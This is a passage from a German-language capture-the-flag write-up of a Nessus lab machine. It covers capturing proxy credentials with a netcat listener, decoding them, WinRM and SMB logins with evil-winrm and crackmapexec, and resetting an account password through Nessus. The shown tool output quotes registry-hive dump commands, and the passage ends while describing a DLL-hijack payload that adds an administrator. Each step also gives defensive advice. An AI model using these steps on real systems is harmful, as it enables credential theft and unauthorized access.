+                <strong>Analyse:</strong> In der Nessus-Weboberfläche ändere ich die Proxy-Authentifizierungsmethode von "Auto Detect" auf "Basic" f&uuml;r den konfigurierten Proxy-Benutzer "nesus" auf 192.168.2.199:8080. Nach der Änderung l&ouml;se ich Nessus erneut dazu aus, über den Proxy zu kommunizieren (z.B. durch Versuch eines Plugin-Updates oder &auml;hnliches, was nicht explizit im Log gezeigt ist). Der Netcat-Listener auf Port 8080 f&auml;ngt eine neue Anfrage ab. Diesmal enth&auml;lt die Anfrage einen <span class="command">Proxy-Authorization: Basic bmVzdXM6WiNKdVhIJHBoLTt2QCxYJm1WKQ==</span> Header. Dies ist ein Base64-kodierter String, der die Anmeldedaten f&uuml;r den Proxy-Benutzer enth&auml;lt.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Erfolg! Durch das Ändern der Proxy-Authentifizierung auf Basic Auth wurde Nessus gezwungen, die Anmeldedaten base64-kodiert an meinen Proxy zu senden. Ich habe nun den Base64-String abgefangen, der den Benutzernamen und das Passwort f&uuml;r den Proxy-Account enth&auml;lt. Dies ist ein kritischer Anmeldedaten-Leak.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Wenn Anmeldedaten im Proxy-Verkehr vermutet werden, aber nicht sofort sichtbar sind, versuche, die Authentifizierungsmethode auf dem Zielsystem zu ändern, um die &Uuml;bermittlung zu erzwingen. Identifiziere g&auml;ngige Kodierungen (Base64) und dekodiere die gefundenen Strings.
+                <br><strong>Empfehlung (Admin):</strong> Verwende keine Basic Authentication über unverschl&uuml;sselte Kan&auml;le (HTTP). Wenn ein Proxy mit Authentifizierung verwendet wird, stelle sicher, dass der Kanal (zwischen Anwendung und Proxy) verschl&uuml;sselt ist (HTTPS). Vermeide das Speichern von Anmeldedaten in Klartext oder schwachen Kodierungen in Konfigurationen.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+<span class="command">https://192.168.2.65:8834/#/settings/proxy-server</span>
+
+<span class="command">Host           192.168.2.199</span>      
+<span class="command">Port           8080</span>
+<span class="command">Username       nesus</span> 
+<span class="command">Auth Method    Basic</span>
+</pre></div>
+            </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+┌──(root㉿CCat)-[~] 
+└─# <span class="command">nc -lvnp 8080</span>
+                     </div>
+                 </div>
+                 <div class="terminal"><pre>
+<span class="password">listening on [any] 8080 ...</span>
+<span class="password">connect to [192.168.2.199] from (UNKNOWN) [192.168.2.65] 49703</span>
+<span class="command">CONNECT plugins.nessus.org:443 HTTP/1.1</span>
+<span class="password">Proxy-Authorization: Basic bmVzdXM6WiNKdVhIJHBoLTt2QCxYJm1WKQ==</span>
+<span class="command">Host: plugins.nessus.org</span>
+<span class="command">Connection: keep-Alive</span>
+<span class="command">User-Agent: Nessus/10.7.3</span>
+<span class="command">Content-Length: 0</span>
+<span class="command">Proxy-Connection: Keep-Alive</span>
+</pre></div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Ich dekodiere den abgefangenen Base64-String (<code>bmVzdXM6WiNKdVhIJHBoLTt2QCxYJm1WKQ==</code>) mit dem <code>base64 -d</code> Befehl. Der Befehl <code>echo &quot;bmVzdXM6WiNKdVhIJHBoLTt2QCxYJm1WKQ==&quot; -n | base64 -d</code> gibt den String an <code>base64 -d</code> weiter, das ihn dekodiert. Die Ausgabe ist <span class="password">nesus:Z#JuXH$ph-;v@,X&mV)</span>. Dies sind die Anmeldedaten im Format Benutzername:Passwort. Der Benutzername ist <span class="command">nesus</span> und das Passwort ist <span class="password">Z#JuXH$ph-;v@,X&mV)</span>.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Fantastisch! Ich habe ein Klartext-Passwort f&uuml;r den Benutzer &#x27;nesus&#x27; erhalten. Dieses Passwort sieht komplex aus und w&auml;re schwer zu erraten oder zu knacken. Die Preisgabe dieser Anmeldedaten &uuml;ber einen unverschl&uuml;sselten Kanal (oder einen Kanal, den ich abfangen konnte) ist eine kritische Schwachstelle. Dies ist wahrscheinlich ein Benutzerkonto auf dem Zielsystem selbst, das f&uuml;r den Proxy-Zugriff konfiguriert wurde.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Dekodiere alle gefundenen Base64-Strings, da sie oft Anmeldedaten oder andere sensible Informationen enthalten. Versuche, die gefundenen Anmeldedaten f&uuml;r andere Dienste auf dem Zielsystem zu verwenden (Pass-the-Hash oder Pass-the-Password).
+                <br><strong>Empfehlung (Admin):</strong> Vermeide das Speichern oder &Uuml;bertragen von Passw&ouml;rtern in Klartext oder einfacher Kodierung. Erzwinge verschl&uuml;sselte Kommunikationskan&auml;le f&uuml;r Authentifizierung.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+┌──(root㉿CCat)-[~] 
+└─# <span class="command">echo &quot;bmVzdXM6WiNKdVhIJHBoLTt2QCxYJm1WKQ==&quot; -n | base64 -d</span>
+                     </div>
+                 </div>
+                 <div class="terminal"><pre>
+<span class="password">nesus:Z#JuXH$ph-;v@,X&mV)</span>
+</pre></div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Mit den Anmeldedaten <span class="command">nesus:<span class="password">Z#JuXH$ph-;v@,X&mV)</span></span> versuche ich, mich &uuml;ber WinRM (Windows Remote Management) mit dem Zielsystem zu verbinden. Ich nutze das Tool <code>evil-winrm</code> (<code>evil-winrm -i 192.168.2.65 -u nesus -p &#x27;Z#JuXH$ph-;v@,X&amp;mV)&#x27;</code>). WinRM ist ein Dienst auf Port 5985, den Nmap als offen identifiziert hat, und er ist eine Standardmethode f&uuml;r die Remote-Verwaltung von Windows-Systemen, die oft mit hohen Rechten konfiguriert ist. Der Versuch schlägt mit der Fehlermeldung &quot;<span class="password">Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError</span>&quot; und &quot;<span class="password">Error: Exiting with code 1</span>&quot; fehl. Dies deutet auf ein Autorisierungsproblem hin, m&ouml;glicherweise sind die Anmeldedaten nicht korrekt oder das Konto hat keine Berechtigung f&uuml;r WinRM-Zugriff.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der direkte WinRM-Login mit den gefundenen Anmeldedaten schlägt fehl. Dies bedeutet, dass der Benutzer &#x27;nesus&#x27; entweder nicht existiert, das Passwort falsch ist oder das Konto keine WinRM-Berechtigungen hat. Ich muss einen alternativen Weg mit diesen Anmeldedaten pr&uuml;fen, z.B. SMB.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Wenn Anmeldedaten gefunden werden, versuche sie f&uuml;r alle verf&uuml;gbaren Dienste (WinRM, SMB, RDP, etc.) im Pass-the-Hash- oder Pass-the-Password-Angriff zu verwenden. Analysiere Fehlermeldungen, um die Ursache des Fehlschlags zu verstehen.
+                <br><strong>Empfehlung (Admin):</strong> Beschr&auml;nke WinRM-Zugriff auf notwendige Benutzer und Systeme. Überwache fehlgeschlagene WinRM-Login-Versuche.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+┌──(root㉿CCat)-[~] 
+└─# <span class="command">evil-winrm -i 192.168.2.65 -u nesus -p &#x27;Z#JuXH$ph-;v@,X&amp;mV)&#x27;</span>
+                     </div>
+                 </div>
+                 <div class="terminal"><pre>
+<span class="command">                                        </span>
+<span class="command">Evil-WinRM shell v3.7</span>
+<span class="command">                                        </span>
+<span class="command">Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline</span>
+<span class="command">                                        </span>
+<span class="command">Data: For more information, check Evil-WinRM GitHub: [Link: https://github.com/Hackplayers/evil-winrm#Remote-path-completion | Ziel: https://github.com/Hackplayers/evil-winrm#Remote-path-completion]</span>
+<span class="command">                                        </span>
+<span class="command">Info: Establishing connection to remote endpoint</span>
+<span class="password">                                        </span>
+<span class="password">Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError</span>
+<span class="password">                                        </span>
+<span class="password">Error: Exiting with code 1</span>
+</pre></div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Ich versuche nun, die Anmeldedaten <span class="command">nesus:<span class="password">Z#JuXH$ph-;v@,X&mV)</span></span> f&uuml;r einen SMB-Login mit CrackMapExec (CME) zu verwenden. CrackMapExec ist ein Post-Exploitation-Tool, das sich auf die Enumeration und Ausnutzung von Active Directory-Umgebungen und Windows/Linux-Hosts &uuml;ber SMB, WinRM, SSH etc. konzentriert. Der Befehl <code>crackmapexec smb 192.168.2.65 -u nesus -p &#x27;Z#JuXH$ph-;v@,X&amp;mV)&#x27;</code> versucht, sich über SMB mit dem Zielsystem unter Verwendung der gefundenen Anmeldedaten anzumelden. Die Ausgabe best&auml;tigt die Systeminformationen &uuml;ber SMB (<span class="command">Windows Server 2022 Build 20348 x64</span>) und die SMB-Signierungseinstellungen. **Wichtig:** Der Login-Versuch schl&auml;gt fehl mit <span class="password">[-] Nessus\nesus:Z#JuXH$ph-;v@,X&mV) STATUS_PASSWORD_EXPIRED</span>.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Fantastisch! Die Fehlermeldung `STATUS_PASSWORD_EXPIRED` ist ein sehr wichtiger Hinweis. Sie best&auml;tigt, dass der Benutzer 'nesus' existiert und das Passwort korrekt ist, aber abgelaufen ist. Dies bedeutet, dass ich das Passwort ändern muss, um das Konto nutzen zu können. Da ich Zugriff auf die Nessus-Weboberfläche habe (mit jose:tequiero), kann ich versuchen, das Passwort für den Benutzer 'nesus' dort zu ändern, assuming jose hat die notwendigen Rechte.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Achte auf Fehlermeldungen bei Login-Versuchen, insbesondere solche, die auf existierende Benutzer oder abgelaufene Passw&ouml;rter hindeuten. Wenn ein Passwort abgelaufen ist und du Zugriff auf eine Schnittstelle mit Verwaltungsrechten hast (wie hier Nessus), versuche, das Passwort zu ändern.
+                <br><strong>Empfehlung (Admin):</strong> Erzwinge regelm&auml;&szlig;ige Passwortänderungen und eine komplexe Passwortrichtlinie. Überwache Login-Versuche mit abgelaufenen Passw&ouml;rtern als Hinweis auf potenzielle Konto-Kompromittierung.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+┌──(root㉿CCat)-[~] 
+└─# <span class="command">crackmapexec smb 192.168.2.65 -u nesus -p &#x27;Z#JuXH$ph-;v@,X&amp;mV)&#x27;</span>
+                     </div>
+                 </div>
+                 <div class="terminal"><pre>
+<span class="command">/usr/lib/python3/dist-packages/cme/cli.py:37: SyntaxWarning: invalid escape sequence '\ '</span>
+<span class="command">  formatter_class=RawTextHelpFormatter)</span>
+<span class="command">/usr/lib/python3/dist-packages/cme/protocols/winrm.py:324: SyntaxWarning: invalid escape sequence '\S'</span>
+<span class="command">  self.conn.execute_cmd(&quot;reg save HKLM\SAM C:\\windows\\temp\\SAM &amp;&amp; reg save HKLM\SYSTEM C:\\windows\\temp\\SYSTEM&quot;)</span>
+<span class="command">/usr/lib/python3/dist-packages/cme/protocols/winrm.py:338: SyntaxWarning: invalid escape sequence '\S'</span>
+<span class="command">  self.conn.execute_cmd(&quot;reg save HKLM\SECURITY C:\\windows\\temp\\SECURITY &amp;&amp; reg save HKLM\SYSTEM C:\\windows\\temp\\SYSTEM&quot;)</span>
+<span class="command">/usr/lib/python3/dist-packages/cme/protocols/smb/smbexec.py:49: SyntaxWarning: invalid escape sequence '\p'</span>
+<span class="command">  stringbinding = &#x27;ncacn_np:%s[\pipe\svcctl]&#x27; % self.__host</span>
+<span class="command">/usr/lib/python3/dist-packages/cme/protocols/smb/smbexec.py:93: SyntaxWarning: invalid escape sequence &#x27;\{&#x27;</span>
+<span class="command">  command = self.__shell + &#x27;echo &#x27;+ data + &#x27; ^&gt; \\\\127.0.0.1\\{}\\{} 2^&gt;^&amp;1 &gt; %TEMP%\\{} &amp; %COMSPEC% /Q /c %TEMP%\\{} &amp; %COMSPEC% /Q /c del %TEMP%\\{}&#x27;.format(self.__share_name, self.__output, self.__batchFile, self.__batchFile, self.__batchFile)</span>
+<span class="command">SMB         192.168.2.65    445    NESSUS           [*] Windows Server 2022 Build 20348 x64 (name:NESSUS) (domain:Nessus) (signing:False) (SMBv1:False)</span>
+<span class="password">SMB         192.168.2.65    445    NESSUS           [-] Nessus\nesus:Z#JuXH$ph-;v@,X&mV) STATUS_PASSWORD_EXPIRED</span> 
+<span class="command"> </span>
+</pre></div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich nutze die Nessus-Weboberfläche, auf die ich mit den Anmeldedaten <span class="command">jose:<span class="password">tequiero</span></span> angemeldet bin, um das Passwort f&uuml;r den Benutzer &#x27;nesus&#x27; zu ändern, dessen Passwort laut CrackMapExec abgelaufen war. Da der Benutzer &#x27;jose&#x27; Administratorrechte auf der Nessus-Instanz hat, ist er wahrscheinlich berechtigt, andere Benutzerkonten zu verwalten. Das Bild zeigt einen Screenshot, der best&auml;tigt, dass das Passwort f&uuml;r den Benutzer &#x27;nesus&#x27; erfolgreich ge&auml;ndert wurde, wahrscheinlich auf einen neuen, bekannten Wert wie &#x27;Test88888$$$&#x27; (basierend auf dem sp&auml;teren Evil-WinRM Login).
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die M&ouml;glichkeit, das Passwort f&uuml;r das 'nesus'-Konto über die Nessus-Oberfläche zu ändern, ist ein entscheidender Schritt zur &Uuml;bernahme dieses Kontos. Ich habe nun g&uuml;ltige und nicht abgelaufene Anmeldedaten f&uuml;r den Benutzer 'nesus'.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Wenn du Zugriff auf eine Verwaltungs-Oberfläche hast, untersuche die Benutzerverwaltungsfunktionen. Ändere Passw&ouml;rter f&uuml;r Konten, die du übernehmen m&ouml;chtest, insbesondere wenn die Passw&ouml;rter abgelaufen sind.
+                <br><strong>Empfehlung (Admin):</strong> Beschr&auml;nke die Rechte von Nessus-Benutzern auf das Notwendige. Implementiere Multi-Faktor-Authentifizierung f&uuml;r Nessus. Überwache Änderungen an Benutzerkonten und Passw&ouml;rtern in Nessus.
+            </p>
+            <img src="passwort_geändert.jpg" alt="hier sieht man wie das passwort erfolgreich geändert wurde" />
+
+            <section id="poc-admin">
+                <h2>Proof of Concept: Erlangen des Administrator-Zugriffs</h2>
+                <p>
+                    <strong>Ziel:</strong> Demonstration der Ausnutzung eines Passwort-Leaks und der M&ouml;glichkeit zur Passwortänderung, um vollen Zugriff auf das System als Benutzer 'nesus' zu erlangen.
+                </p>
+                <p>
+                    <strong>Kurzbeschreibung:</strong> Dieser Proof of Concept zeigt, wie Anmeldedaten f&uuml;r den Benutzer 'nesus' &uuml;ber einen unsicher konfigurierten Proxy in der Nessus-Instanz abgefangen werden k&ouml;nnen. Obwohl das abgefangene Passwort abgelaufen war, erm&ouml;glichten Administratorrechte in Nessus die Passwortänderung, was den Zugriff auf das System über WinRM als Benutzer 'nesus' erm&ouml;glichte.
+                </p>
+                <p>
+                    <strong>Voraussetzungen:</strong>
+                    <ul>
+                        <li>Zugriff auf die Nessus-Weboberfläche mit Administratorrechten (z.B. über gefundene Anmeldedaten wie jose:tequiero).</li>
+                        <li>Eine auf dem Angreifer-System eingerichtete Proxy-Instanz, über die die Nessus-Instanz f&uuml;r externe Kommunikation konfiguriert ist.</li>
+                        <li>Das Konto 'nesus' existiert auf dem Zielsystem, und sein Passwort ist abgelaufen oder das Konto hat WinRM-Rechte.</li>
+                        <li>WinRM ist auf dem Zielsystem aktiviert (Port 5985 offen).</li>
+                        <li>Das Tool `evil-winrm` oder ein &auml;hnlicher WinRM-Client ist auf dem Angreifer-System verf&uuml;gbar.</li>
+                    </ul>
+                </p>
+                <p>
+                    <strong>Schritt-f&uuml;r-Schritt-Anleitung:</strong>
+                    <ol>
+                        <li>Einrichten eines Netcat-Listeners auf dem Angreifer-System auf einem Port, der als Proxy in Nessus konfiguriert ist (z.B. Port 8080).</li>
+                        <li>Ausl&ouml;sen von Netzwerkaktivit&auml;t in Nessus, die über den konfigurierten Proxy l&auml;uft (z.B. Plugin-Updates, externe Lizenzprüfung).</li>
+                        <li>Abfangen der Netzwerkpakete auf dem Netcat-Listener und Identifizierung des Proxy-Authorization-Headers (falls vorhanden).</li>
+                        <li>&Auml;ndern der Proxy-Authentifizierungsmethode in den Nessus-Einstellungen (z.B. auf Basic Auth), falls Anmeldedaten nicht sofort sichtbar sind, um deren &Uuml;bermittlung zu erzwingen.</li>
+                        <li>Dekodieren des Base64-Strings im Proxy-Authorization-Header, um Benutzername und Passwort f&uuml;r den Proxy-Account zu erhalten (z.B. nesus:abgelaufenes_Passwort).</li>
+                        <li>Versuchter WinRM-Login mit den abgefangenen Anmeldedaten und einem Tool wie `evil-winrm`. Bei Fehlermeldung `STATUS_PASSWORD_EXPIRED` Best&auml;tigung, dass Passwort abgelaufen ist.</li>
+                        <li>Nutzung der Nessus-Weboberfläche (mit den jose:tequiero Anmeldedaten), um das Passwort f&uuml;r den Benutzer 'nesus' auf einen bekannten Wert zu ändern.</li>
+                        <li>Erneuter Versuch des WinRM-Logins mit dem Benutzer 'nesus' und dem neu gesetzten Passwort (z.B. Test88888$$$).</li>
+                    </ol>
+                </p>
+                <p>
+                    <strong>Erwartetes Ergebnis:</strong> Erfolgreicher WinRM-Login auf dem Zielsystem als Benutzer 'nesus' und Erlangen einer interaktiven Powershell-Sitzung mit den Rechten dieses Benutzers.
+                </p>
+                 <p>
+                    <strong>Beweismittel:</strong> Die Terminalausgabe, die den erfolgreichen Evil-WinRM Login als Benutzer 'nesus' zeigt.
+                </p>
+                 <p class="risikobewertung">
+                    <strong>Risikobewertung:</strong> Kritisch. Die unsichere Proxy-Konfiguration f&uuml;hrte zum Leak von Anmeldedaten, die, obwohl abgelaufen, durch administrative Rechte in Nessus reaktiviert werden konnten, was zum vollen Zugriff auf das System als Benutzer 'nesus' &uuml;ber WinRM f&uuml;hrte.
+                </p>
+                 <p class="recommendation">
+                    <strong>Empfehlung (Admin):</strong>
+                    <ul>
+                        <li>**Proxy-Konfiguration:** Überpr&uuml;fen Sie alle Anwendungen auf unsicher konfigurierte Proxies, insbesondere solche, die &uuml;ber externe Systeme laufen und Anmeldedaten &uuml;ber unverschl&uuml;sselte Kan&auml;le senden. Verwenden Sie f&uuml;r Proxies nur sichere (HTTPS) Kan&auml;le und starke Authentifizierungsmethoden.</li>
+                        <li>**Anmeldedaten-Management:** Speichern Sie Passw&ouml;rter nicht in Konfigurationsdateien oder Anwendungen, insbesondere nicht in Klartext oder einfach kodiert. Verwenden Sie sicherere Mechanismen zur Verwaltung von Geheimnissen.</li>
+                        <li>**Nessus-Zugriff:** Schützen Sie den Zugriff auf die Nessus-Oberfläche mit starken, eindeutigen Passw&ouml;rtern und Multi-Faktor-Authentifizierung. Überpr&uuml;fen und beschr&auml;nken Sie die Rechte von Nessus-Benutzern auf das Notwendige.</li>
+                        <li>**WinRM-Zugriff:** Beschr&auml;nken Sie den WinRM-Zugriff auf notwendige administrative Konten und Quell-IP-Adressen. Überwachen Sie fehlgeschlagene WinRM-Login-Versuche.</li>
+                    </ul>
+                </p>
+            </section>
+             <p class="analysis">
+                <strong>Analyse:</strong> Mit den nun g&uuml;ltigen Anmeldedaten <span class="command">nesus:Test88888$$$</span> versuche ich erneut, mich &uuml;ber WinRM mit dem Zielsystem zu verbinden. Ich nutze wieder das Tool <code>evil-winrm</code> (<code>evil-winrm -i 192.168.2.66 -u nesus -p &#x27;Test88888$$$&#x27;</code>). Beachte die IP-Adresse 192.168.2.66 im Log – dies scheint ein Tippfehler zu sein und sollte wahrscheinlich 192.168.2.65 sein, die IP des Zielsystems. Wichtig ist: Die Verbindung ist diesmal erfolgreich! Ich erhalte eine interaktive Powershell-Sitzung, erkennbar am Prompt &quot;<span class="command">*Evil-WinRM* PS C:\Users\nesus\Documents&gt;</span>&quot;. Ich bin nun als Benutzer &#x27;nesus&#x27; auf dem System angemeldet.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Fantastisch! Der WinRM-Login als Benutzer &#x27;nesus&#x27; war erfolgreich, nachdem das Passwort ge&auml;ndert wurde. Ich habe nun vollen Remote-Shell-Zugriff auf das System unter den Rechten dieses Benutzers. Dies ist ein erfolgreicher Initial Access (oder genauer gesagt, ein fortgeschrittener Zugriff nach den Nessus-Creds). Die weiteren Schritte zur Privilegieneskalation k&ouml;nnen nun aus der Perspektive des Benutzers &#x27;nesus&#x27; erfolgen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nutze WinRM als bevorzugten Weg f&uuml;r Remote-Zugriff und Ausf&uuml;hrung von Befehlen auf Windows, wenn es verfügbar ist. Es bietet eine stabile und interaktive Shell. Best&auml;tige immer den aktuellen Benutzer nach dem Login.
+                <br><strong>Empfehlung (Admin):</strong> Wie im POC beschrieben, sichere WinRM-Zugriff streng ab.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+┌──(root㉿CCat)-[~] 
+└─# <span class="command">evil-winrm -i 192.168.2.66 -u nesus -p &#x27;Test88888$$$&#x27;</span>
+                     </div>
+                 </div>
+                 <div class="terminal"><pre>
+<span class="command">                                        </span>
+<span class="command">Evil-WinRM shell v3.7</span>
+<span class="command">                                        </span>
+<span class="command">Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline</span>
+<span class="command">                                        </span>
+<span class="command">Data: For more information, check Evil-WinRM GitHub: [Link: https://github.com/Hackplayers/evil-winrm#Remote-path-completion | Ziel: https://github.com/Hackplayers/evil-winrm#Remote-path-completion]</span>
+<span class="command">                                        </span>
+<span class="password">Info: Establishing connection to remote endpoint</span>
+<span class="password">                                        </span>
+<span class="command">*Evil-WinRM* PS C:\Users\nesus\Documents&gt;</span> 
+</pre></div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> In der Evil-WinRM Shell als Benutzer &#x27;nesus&#x27; beginne ich mit der Aufklärung des Dateisystems, um die Benutzer-Flag zu finden. Basierend auf g&auml;ngigen CTF-Pfaden und dem Benutzernamen &#x27;nesus&#x27;, suche ich auf dem Desktop dieses Benutzers. Ich navigiere zum Desktop-Verzeichnis (<code>ls ..\Desktop</code>) und finde die Datei <span class="command">user.txt</span>. Ich lese den Inhalt der Datei mit <code>cat ..\Desktop\user.txt</code>. Die Ausgabe ist <span class="password">72113f41d43e88eb5d67f732668bc3d1</span>.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Benutzer-Flag wurde erfolgreich gefunden und ausgelesen. Dies best&auml;tigt, dass ich vollen Dateizugriff innerhalb des Benutzerprofils von 'nesus' habe. Der Wert der Flag sieht wie ein Hash aus, was f&uuml;r die tats&auml;chliche Flag ungew&ouml;hnlich ist, aber in diesem Kontext als solche gewertet wird.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Suche nach Flags an Standardorten f&uuml;r Benutzer. Nutze Dateisystembefehle der Shell (ls, dir, cat, type, Get-ChildItem, Get-Content).
+                <br><strong>Empfehlung (Admin):</strong> Vermeide das Speichern von sensiblen Daten (Flags in einer Testumgebung, tatsächliche sensible Daten in einer realen Umgebung) auf dem Desktop oder in leicht zugänglichen Benutzerverzeichnissen.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+<span class="command">*Evil-WinRM* PS C:\Users\nesus\Documents&gt; ls ..\Desktop</span>
+                     </div>
+                 </div>
+                 <div class="terminal"><pre>
+
+    <span class="command">Directory: C:\Users\nesus\Desktop</span>
+
+
+<span class="command">Mode                 LastWriteTime         Length Name</span>
+<span class="command">----                 -------------         ------ ----</span>
+<span class="command">-a----        10/18/2024   1:41 PM             33 user.txt</span>
+</pre></div>
+            </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+<span class="command">*Evil-WinRM* PS C:\Users\nesus\Documents&gt; cat ..\Desktop\user.txt</span>
+                     </div>
+                 </div>
+                 <div class="terminal"><pre>
+<span class="password">72113f41d43e88eb5d67f732668bc3d1</span>
+</pre></div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Ich pr&uuml;fe die Privilegien des aktuellen Benutzers &#x27;nesus&#x27; mit <code>whoami /priv</code> in der Evil-WinRM Shell. Die Ausgabe listet die Privilegien auf. Ich sehe <span class="command">SeChangeNotifyPrivilege</span> und <span class="command">SeIncreaseWorkingSetPrivilege</span> als <span class="password">Enabled</span>. Dies sind keine Privilegien, die direkt zur SYSTEM-Eskalation genutzt werden k&ouml;nnen wie SeImpersonatePrivilege. Der Benutzer &#x27;nesus&#x27; hat offenbar keine sofort offensichtlichen Privilegien f&uuml;r eine Standard-Potato-Angriff.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Überpr&uuml;fung der Privilegien ist immer notwendig. Das Fehlen von kritischen PE-Privilegien wie SeImpersonatePrivilege bedeutet, dass ich andere PE-Vektoren suchen muss. Der Benutzer 'nesus' scheint kein Dienstkonto mit erweiterten Rechten zu sein, das leicht ausgenutzt werden kann.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Prüfe immer Privilegien nach dem Erlangen einer Shell. Wenn keine ausnutzbaren Privilegien vorhanden sind, suche nach anderen PE-Vektoren (Weak Service Permissions, Unquoted Service Paths, DLL Hijacking, AutoRuns, Scheduled Tasks, Passw&ouml;rter in Konfigurationen/Registry etc.).
+                <br><strong>Empfehlung (Admin):</strong> Implementiere das Prinzip der geringsten Privilegien. Überpr&uuml;fe und bereinige unn&ouml;tige Privilegien f&uuml;r alle Benutzerkonten.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+<span class="command">*Evil-WinRM* PS C:\Users\nesus\Documents&gt; whoami /priv</span>
+                     </div>
+                 </div>
+                 <div class="terminal"><pre>
+
+<span class="command">PRIVILEGES INFORMATION</span>
+<span class="command">----------------------</span>
+
+<span class="command">Privilege Name                Description                    State</span>
+<span class="command">============================= ============================== =======</span>
+<span class="command">SeChangeNotifyPrivilege       Bypass traverse checking       Enabled</span>
+<span class="command">SeIncreaseWorkingSetPrivilege Increase a process working set Enabled</span>
+</pre></div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Ich versuche, auf das Verzeichnis des Administrators zuzugreifen (<code>ls ..\..\..\Users\Administrator</code>), um zu sehen, ob ich Lesezugriff auf das Administrator-Profil habe, insbesondere auf den Desktop, wo die Root-Flag vermutet wird. Der Befehl schl&auml;gt mit &quot;<span class="password">Access to the path &#x27;C:\Users\Administrator&#x27; is denied.</span>&quot; fehl. Dies best&auml;tigt, dass der Benutzer &#x27;nesus&#x27; keine Leseberechtigungen f&uuml;r das Administrator-Profil hat. Ich kann die Root-Flag nicht direkt als 'nesus' lesen. Ich muss meine Privilegien zu Administrator oder SYSTEM eskalieren.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das Scheitern des Zugriffs auf das Administrator-Verzeichnis best&auml;tigt, dass eine Privilegieneskalation notwendig ist, um die Root-Flag zu erlangen und vollst&auml;ndige Kontrolle zu erhalten. Die Dateisystemberechtigungen sind f&uuml;r normale Benutzer korrekt gesetzt.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Überpr&uuml;fe Dateisystemberechtigungen f&uuml;r privilegierte Verzeichnisse (Administrator-Profil, System32, Program Files etc.). Suche nach Weak Permissions als PE-Vektor.
+                <br><strong>Empfehlung (Admin):</strong> Stelle sicher, dass Dateisystemberechtigungen korrekt konfiguriert sind und unprivilegierte Benutzer keinen Zugriff auf sensible Verzeichnisse oder Dateien haben.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+<span class="command">*Evil-WinRM* PS C:\Users\nesus\Documents&gt; ls ..\..\..\Users\Administrator</span>
+                     </div>
+                 </div>
+                 <div class="terminal"><pre>
+<span class="password">Access to the path 'C:\Users\Administrator' is denied.</span>
+<span class="command">At line:1 char:1</span>
+<span class="command">+ ls ..\..\..\Users\Administrator</span>
+<span class="command">+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span>
+<span class="command">    + CategoryInfo          : PermissionDenied: (C:\Users\Administrator:String) [Get-ChildItem], UnauthorizedAccessException</span>
+<span class="command">    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand</span>
+</pre></div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Da der direkte Zugriff auf das Administrator-Profil fehlschlug und keine einfachen Privilegieneskalations-Privilegien gefunden wurden, konzentriere ich mich auf die Nessus-Installation. Nessus l&auml;uft oft mit hohen Privilegien und kann anf&auml;llig f&uuml;r DLL-Hijacking sein, wenn es beim Start DLLs aus Verzeichnissen l&auml;dt, in die unprivilegierte Benutzer schreiben d&uuml;rfen. Ich erstelle eine b&ouml;sartige DLL (<code>hacker.c</code> kompiliert zu <code>legacy.dll</code>), die bei Ausf&uuml;hrung des Nessus-Dienstes einen neuen Benutzer 'hacker' mit Passwort 'hacker' hinzuf&uuml;gt und diesen der lokalen Administratoren-Gruppe hinzuf&uuml;gt. Der C-Code wird in der Shell mit einem Here-Dokument (<code>cat &lt;&lt; EOF &gt; hacker.c ... EOF</code>) erstellt und dann mit dem Mingw-Cross-Compiler auf meinem Kali-System f&uuml;r Windows kompiliert (<code>x86_64-w64-mingw32-gcc hacker.c -o legacy.dll --shared</code>).
+            </p>
+            <p class="evaluation">
